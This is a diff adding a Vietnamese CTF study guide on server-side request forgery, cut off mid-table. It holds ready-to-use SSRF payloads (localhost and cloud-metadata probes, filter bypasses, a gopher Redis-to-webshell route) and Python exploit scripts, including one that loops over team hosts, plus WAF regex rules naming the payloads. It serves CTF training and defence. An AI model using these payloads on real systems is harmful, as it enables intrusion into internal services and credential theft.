@@ -1,0 +1,520 @@
+<title>SSRF — Server-Side Request Forgery — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · SSRF</div>
+    <h1>SSRF — Server-Side Request Forgery</h1>
+    <p class="sub">Khi server tự đi tải 1 URL do bạn cung cấp (webhook, fetch ảnh từ link, tạo PDF từ URL) — bạn
+    có thể ép nó gọi tới những địa chỉ <strong>chỉ server mới với tới được</strong> (dịch vụ nội bộ như Redis,
+    database, API admin) mà chính bạn không thể truy cập trực tiếp từ bên ngoài.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>SSRF là gì, để làm gì?</h2>
+  <p class="lead">Nhiều chức năng web cần server tự đi "lấy hộ" 1 thứ gì đó từ URL do người dùng cung cấp: tải
+  ảnh đại diện từ link, tạo preview link, convert URL thành PDF, gọi webhook. Nếu bạn đổi URL đó thành
+  <code>http://127.0.0.1:6379</code> (Redis nội bộ) hay <code>http://admin-api:8080/secret</code>, server sẽ tự
+  "đi tới đó thay bạn" — bạn đọc được dữ liệu/gọi được dịch vụ mà bình thường tường lửa chặn truy cập trực tiếp
+  từ Internet, vì request này xuất phát <strong>từ chính server</strong>, không phải từ máy bạn.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  SSRF biến server thành "proxy miễn phí" cho bạn vào mạng nội bộ. Luôn thử trước:
+  <code>http://127.0.0.1/</code>, <code>http://localhost/</code>, và tên service nội bộ đoán được theo convention
+  Docker Compose (<code>http://web:5000</code>, <code>http://redis:6379</code>, <code>http://db:3306</code>).</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ SSRF</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Chức năng nhận URL làm tham số: webhook, "URL ảnh đại diện", "tạo PDF từ URL", "preview link". Thử gửi
+        <code>http://127.0.0.1:80/</code> → nếu response khác hẳn (thành công/lỗi khác với URL ngoài) ⟹ server
+        thực sự đi fetch URL đó.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Response có <strong>phản hồi lại nội dung</strong> URL đã fetch (không bắt buộc, nhưng dễ xác nhận hơn
+        nhiều — nếu không, cần kỹ thuật blind, xem mục 06).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: thử lần lượt <code>127.0.0.1</code>, <code>localhost</code>, cổng phổ biến
+        (80,3000,5000,6379,8080,9200) — so sánh response time/nội dung để biết cổng nào có dịch vụ đang chạy.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># 1. Xác nhận SSRF cơ bản</span>
+url=http://127.0.0.1:80/
+url=http://localhost/admin
+
+<span class="c"># 2. Dò service nội bộ theo tên Docker Compose</span>
+url=http://web:5000/
+url=http://redis:6379/
+url=http://db:3306/
+
+<span class="c"># 3. Tấn công Redis qua gopher:// (sinh payload bằng Gopherus, mục 07)</span>
+url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+html = requests.post(<span class="s">"http://TARGET/webhook"</span>, data={<span class="s">"url"</span>: <span class="s">"http://127.0.0.1:5000/admin/flag"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Bị chặn <code>127.0.0.1</code>/<code>localhost</code> theo blacklist chuỗi → đổi biểu diễn IP (mục 06).
+        Không thấy response → thử blind (đo thời gian) hoặc OOB qua listener riêng (giống bài XXE). WAF rule
+        nhanh: chặn regex <code>127\.0\.0\.1|localhost|169\.254\.169\.254</code> trong tham số URL. Chưa hiểu?
+        đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Mạng nội bộ (internal network)</b> — trong môi trường Docker/K8s, các service (web app,
+  database, cache Redis) thường chạy trong 1 mạng riêng, chỉ gọi được lẫn nhau qua <strong>tên service</strong>
+  (không phải IP public), và KHÔNG mở ra Internet — chỉ server trong mạng đó mới gọi tới được.</div>
+  <div class="def"><b>Docker Compose service name</b> — khi dùng Docker Compose, mỗi container có thể gọi
+  container khác bằng đúng <strong>tên khai báo trong file <code>docker-compose.yml</code></strong> làm hostname
+  (vd service tên <code>redis</code> thì container khác gọi được bằng <code>http://redis:6379</code>).</div>
+  <div class="def"><b>Gopher protocol</b> — giao thức cũ, cho phép gửi <strong>byte tùy ý</strong> tới 1
+  cổng/địa chỉ qua URL dạng <code>gopher://host:port/_data</code>. Vì nhiều dịch vụ nội bộ (Redis, Memcached,
+  SMTP) giao tiếp bằng giao thức văn bản đơn giản, gopher cho phép bạn "giả lập" gửi lệnh thật của dịch vụ đó
+  qua chính request SSRF.</div>
+  <p>Code hay viết (thiếu validate URL đích):</p>
+  <pre><code><span class="c"># Python/Flask — tải ảnh từ URL người dùng cung cấp, không kiểm tra đích</span>
+url = request.form[<span class="s">'url'</span>]
+resp = requests.get(url)   <span class="c"># gọi tới BẤT KỲ URL nào, kể cả nội bộ</span>
+<span class="k">return</span> resp.content</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Server tin tưởng mù quáng URL do người dùng cung cấp</h2>
+  <p>Lập trình viên nghĩ "tính năng này chỉ dùng để tải ảnh/webhook từ Internet", nên không nghĩ tới việc kiểm
+  tra xem URL có trỏ vào <strong>chính mạng nội bộ của hệ thống</strong> hay không. Về bản chất, thư viện HTTP
+  client (<code>requests</code>, <code>axios</code>, <code>curl</code>...) <strong>không phân biệt</strong> "URL
+  bên ngoài" với "URL nội bộ" — nó chỉ thấy 1 địa chỉ IP/hostname và kết nối tới. Việc giới hạn đích chỉ xảy ra
+  nếu lập trình viên <strong>chủ động thêm</strong> allowlist/kiểm tra IP — bước này rất hay bị bỏ qua vì "ai lại
+  gửi URL nội bộ làm gì".</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Server là "trạm trung chuyển" bạn mượn quyền truy cập mạng</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr16)}
+    </style>
+    <defs><marker id="arr16" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <text x="10" y="18" class="lbl-m">Bạn (ngoài mạng nội bộ) -- KHÔNG tới trực tiếp được Redis</text>
+    <rect x="10" y="30" width="180" height="50" rx="10" class="box-a"/>
+    <text x="22" y="48" class="lbl-m">Bạn gửi:</text>
+    <text x="22" y="64" class="lbl-a">url=http://redis:6379</text>
+
+    <path d="M190,55 H228" class="arrow"/>
+    <rect x="233" y="30" width="195" height="50" rx="10" class="box"/>
+    <text x="245" y="48" class="lbl-m">Server (BÊN TRONG mạng)</text>
+    <text x="245" y="64" class="lbl">tự thay bạn kết nối tới redis:6379</text>
+
+    <path d="M428,55 H465" class="arrow"/>
+    <rect x="470" y="30" width="195" height="50" rx="10" class="box-a"/>
+    <text x="482" y="48" class="lbl-m">Redis chấp nhận vì request</text>
+    <text x="482" y="64" class="lbl-a">tới TỪ server, không phải từ bạn</text>
+
+    <text x="10" y="120" class="lbl-m">Bản chất: tường lửa/mạng nội bộ chỉ kiểm tra "request tới từ đâu" (IP nguồn)</text>
+    <text x="10" y="138" class="lbl-m">-&gt; SSRF khiến IP nguồn luôn là server (hợp lệ), dù Ý ĐỒ thật là của bạn</text>
+  </svg>
+  </div>
+  <p>Điều này giải thích vì sao SSRF đặc biệt mạnh trong môi trường Docker Compose của CTF: mọi service (app,
+  database, cache...) thường nằm chung 1 <code>docker network</code>, server web luôn có đường kết nối hợp lệ
+  tới các service khác (đó là thiết kế bình thường của hệ thống) — SSRF chỉ đơn giản là "mượn" đúng con đường kết
+  nối hợp lệ đó cho mục đích của bạn.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Chức năng "URL ảnh đại diện", "import từ link", webhook, "tạo PDF/screenshot từ URL"</td><td>App tự đi fetch URL — bề mặt SSRF kinh điển</td></tr>
+    <tr><td>Response time khác biệt rõ giữa URL tồn tại và không tồn tại (port đóng/mở)</td><td>Dấu hiệu blind SSRF — dùng để dò port nội bộ dù không thấy nội dung response</td></tr>
+    <tr><td>App có nhắc tới kiến trúc microservice/nhiều container (xem docker-compose.yml nếu có source)</td><td>Gợi ý tên service nội bộ để thử (mục 06)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dò port/service nội bộ bằng Intruder</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request có tham số URL, Send to Repeater, xác nhận <code>http://127.0.0.1:80/</code> cho response
+    khác với URL ngoài.</li>
+    <li>Send to Intruder, đánh dấu <code>§80§</code> trong <code>http://127.0.0.1:§80§/</code>.</li>
+    <li>Nạp payload list cổng phổ biến: 22,80,443,3000,3306,5000,5432,6379,8080,8443,9200,27017.</li>
+    <li>Start attack, sắp xếp theo <strong>Response time</strong> hoặc <strong>Length</strong> — cổng có dịch vụ
+    thật thường phản hồi khác (nhanh hơn/nội dung khác) so với cổng đóng (timeout hoặc connection refused).</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Chọn đúng kỹ thuật theo tình huống</h2>
+
+  <h3>A. SSRF cơ bản (response hiện nội dung)</h3>
+  <table>
+    <tr><th>Mục tiêu</th><th>Payload</th></tr>
+    <tr><td>Localhost</td><td><code>http://127.0.0.1/</code>, <code>http://localhost/</code>, <code>http://0.0.0.0/</code></td></tr>
+    <tr><td>Service nội bộ theo tên (Docker Compose)</td><td><code>http://web:5000/</code>, <code>http://redis:6379/</code>, <code>http://db:3306/</code>, <code>http://backend/</code></td></tr>
+    <tr><td>Metadata cloud (nếu challenge mô phỏng cloud)</td><td><code>http://169.254.169.254/latest/meta-data/</code></td></tr>
+  </table>
+
+  <h3>B. Vượt bộ lọc blacklist</h3>
+  <table>
+    <tr><th>Bị chặn</th><th>Cách né</th></tr>
+    <tr><td>Chặn chuỗi <code>127.0.0.1</code>/<code>localhost</code></td><td>Đổi biểu diễn: decimal <code>http://2130706433/</code>, octal <code>http://0177.0.0.1/</code>, hex <code>http://0x7f000001/</code>, IPv6 <code>http://[::1]/</code>, <code>http://[::ffff:127.0.0.1]/</code></td></tr>
+    <tr><td>Chặn mọi IP nội bộ (10.x, 172.x, 192.168.x)</td><td>Domain công khai trỏ về 127.0.0.1: <code>http://localtest.me/</code>, <code>http://127.0.0.1.nip.io/</code> (DNS rebinding đơn giản — domain thật nhưng resolve ra IP nội bộ)</td></tr>
+    <tr><td>App chặn localhost nhưng CHO PHÉP theo redirect</td><td>Trỏ URL ban đầu ra ngoài (vd server bạn kiểm soát), server đó trả HTTP 302 redirect tới <code>http://127.0.0.1/</code> — app tự đi theo redirect</td></tr>
+    <tr><td>Parser differential trong URL (app check domain nhưng request lib hiểu khác)</td><td><code>http://expected-domain@127.0.0.1/</code> (phần trước <code>@</code> chỉ là username, bị bỏ qua khi kết nối thật), ký tự <code>#</code>/khoảng trắng gây hiểu nhầm phần nào là host</td></tr>
+  </table>
+
+  <h3>C. SSRF → RCE qua gopher (Redis)</h3>
+  <p>Nếu dò ra Redis nội bộ không có mật khẩu (rất phổ biến trong CTF), gopher cho phép gửi lệnh Redis thật qua
+  URL, có thể dẫn tới ghi file (webshell) nếu Redis dùng chung volume với webroot. Dùng công cụ sinh payload ở
+  mục 07 thay vì tự tính byte tay.</p>
+
+  <h3>D. Blind SSRF (không có response)</h3>
+  <p>Dùng timing (so sánh thời gian phản hồi giữa port mở/đóng) hoặc OOB — trỏ URL ra 1 listener của bạn (giống
+  kỹ thuật bài XXE mục 06.B), xem log server có request tới không để xác nhận SSRF tồn tại dù không đọc được nội
+  dung response.</p>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: GOPHERUS</div>
+  <h2>Không muốn tự tính byte gopher? Dùng Gopherus</h2>
+  <div class="def"><b>Gopherus</b> — công cụ tự sinh URL <code>gopher://</code> đúng định dạng cho nhiều dịch vụ
+  (Redis, MySQL, FastCGI, SMTP...) chỉ cần bạn chọn dịch vụ và điền lệnh muốn chạy — không cần tự hiểu giao thức
+  binary của từng service. Đã clone về <code>~/hoc/CTF/Tools/web/Gopherus/</code> (từ <code>tarunkant/Gopherus</code>,
+  3400+ sao).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/Gopherus
+python3 gopherus.py --exploit redis
+<span class="c"># Công cụ hỏi tương tác: nhập lệnh Redis muốn chạy (vd ghi webshell PHP vào webroot)</span>
+<span class="c"># In ra 1 URL gopher:// dài -- dán thẳng vào tham số url= của challenge</span></code></pre>
+  <div class="note warn"><span class="tag">Chỉ hoạt động nếu Redis không mật khẩu</span>Gopherus giả định Redis
+  nội bộ không yêu cầu auth (rất phổ biến trong môi trường dev/CTF, nhưng không phải luôn đúng) — nếu Redis có
+  mật khẩu, cần biết trước mật khẩu đó (qua recon/source leak) để thêm lệnh <code>AUTH</code> vào payload.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/webhook"</span>
+
+<span class="c"># Bước 1: xác nhận SSRF, dò service nội bộ</span>
+<span class="k">for</span> target <span class="k">in</span> [<span class="s">"http://127.0.0.1:5000/"</span>, <span class="s">"http://redis:6379/"</span>, <span class="s">"http://db:3306/"</span>]:
+    r = requests.post(url, data={<span class="s">"url"</span>: target}, timeout=5)
+    <span class="k">print</span>(target, r.status_code, len(r.text))
+
+<span class="c"># Bước 2: gọi đúng endpoint nội bộ chứa flag</span>
+r = requests.post(url, data={<span class="s">"url"</span>: <span class="s">"http://127.0.0.1:5000/admin/flag"</span>})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dò nhiều service, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+TARGETS = [<span class="s">"http://127.0.0.1:5000/admin/flag"</span>, <span class="s">"http://web:5000/admin/flag"</span>,
+           <span class="s">"http://127.0.0.1/admin/flag"</span>]
+
+<span class="k">def</span> <span class="d">exploit_ssrf</span>(host):
+    <span class="k">for</span> t <span class="k">in</span> TARGETS:
+        r = requests.post(<span class="s">f"http://{host}/webhook"</span>, data={<span class="s">"url"</span>: t}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">if</span> m:
+            <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_ssrf(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+TARGET_URL = <span class="s">"http://127.0.0.1:5000/admin/flag"</span>   <span class="c"># đã xác nhận ăn từ bước thử tay</span>
+
+<span class="k">def</span> <span class="d">exploit_ssrf</span>(host):
+    <span class="k">try</span>:
+        r = requests.post(<span class="s">f"http://{host}/webhook"</span>, data={<span class="s">"url"</span>: TARGET_URL}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_ssrf(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có chức năng "Preview URL" — nhập link, server tải về và hiện title trang.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận SSRF</div><div class="d"><code>url=http://127.0.0.1:80/</code> → Response khác hẳn URL ngoài (có title lạ) ⟹ xác nhận.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Dò service nội bộ</div><div class="d">Thử <code>http://admin-panel:8080/</code> (đoán theo tên thường gặp) → Response hiện "Admin Dashboard" ⟹ tìm đúng service.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Gọi endpoint chứa flag</div><div class="d"><code>url=http://admin-panel:8080/api/flag</code> → Response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex, soi tham số URL)</th><th>Khớp gì</th></tr>
+    <tr><td><code>(?i)127\.0\.0\.1|localhost|0\.0\.0\.0</code></td><td>Các dạng localhost phổ biến nhất</td></tr>
+    <tr><td><code>169\.254\.169\.254</code></td><td>Cloud metadata endpoint</td></tr>
+    <tr><td><code>^gopher://|^file://|^dict://</code></td><td>Giao thức ít khi hợp lệ cho chức năng "tải ảnh/webhook" thông thường</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Nếu chức năng này LÀ webhook phục vụ cờ (BTC
+  thiết kế để các đội gọi lẫn nhau hợp lệ), chặn quá tay sẽ vi phạm "chặn API phục vụ cờ" (bị trừ SVC gấp đôi).
+  Xác nhận rõ mục đích chức năng trước khi chặn.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
